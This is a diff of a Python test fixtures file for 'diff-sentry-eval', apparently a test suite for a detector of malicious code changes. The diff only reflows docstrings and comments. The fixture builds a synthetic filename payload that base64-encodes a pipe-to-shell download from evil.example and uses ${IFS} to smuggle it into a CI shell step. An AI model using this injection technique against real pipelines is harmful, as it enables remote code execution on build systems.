@@ -1,8 +1,6 @@
-"""Shared fixtures for diff-sentry-eval tests: SYNTHETIC in-code traces (the diff_sentry test style),
-never gitignored `output/traces/` artifacts, so the suite runs on a fresh clone / in CI with zero creds.
+"""Shared fixtures for diff-sentry-eval tests: SYNTHETIC in-code traces (the diff_sentry test style), never gitignored `output/traces/` artifacts, so the suite runs on a fresh clone / in CI with zero creds.
 
-The verdict + evidence are driven through a real `scan_indicators` baseline + the result event's judgement,
-exactly as `diff_sentry.assemble.verdict_from_events` re-sources them on read.
+The verdict + evidence are driven through a real `scan_indicators` baseline + the result event's judgement, exactly as `diff_sentry.assemble.verdict_from_events` re-sources them on read.
 """
 
 from __future__ import annotations
@@ -12,8 +10,7 @@ import base64
 import pytest
 from diff_sentry_eval.taskset import EvalTask
 
-# A hackerbot-claw-style filename payload: base64 of a pipe-to-shell command, smuggled with ${IFS}
-# space-evasion inside a command substitution a CI workflow could interpolate into a shell step.
+# A hackerbot-claw-style filename payload: base64 of a pipe-to-shell command, smuggled with ${IFS} space-evasion inside a command substitution a CI workflow could interpolate into a shell step.
 _CMD = "curl -sSfL http://evil.example/m | bash"
 _B64 = base64.b64encode(_CMD.encode()).decode()
 _MALICIOUS_FILENAME = f"$(echo${{IFS}}{_B64}|base64${{IFS}}-d|bash)"
@@ -45,10 +42,7 @@ _EMPTY_VERDICT = {"summary": "", "verdict": "", "confidence": 0.0, "rationale": 
 
 def record_run(tmp_path, *, run_id, with_result=True, verdict=None, change=None,
                emit_on=("suspicious", "malicious"), max_iterations=25):
-    """Write a synthetic diff-sentry run to `tmp_path/<run_id>.jsonl` through the REAL TraceRecorder, so the
-    load_events → group_by_run path is exercised against the actual wire format. `with_result=False` → the
-    run never finalized; `verdict` defaults to a malicious verdict (pass `_EMPTY_VERDICT` for a run with
-    no usable label). Returns the run's events."""
+    """Write a synthetic diff-sentry run to `tmp_path/<run_id>.jsonl` through the REAL TraceRecorder, so the load_events → group_by_run path is exercised against the actual wire format. `with_result=False` → the run never finalized; `verdict` defaults to a malicious verdict (pass `_EMPTY_VERDICT` for a run with no usable label). Returns the run's events."""
     from rlm_harness import TraceRecorder, record_tool_call
     from rlm_harness.trace import load_events
 
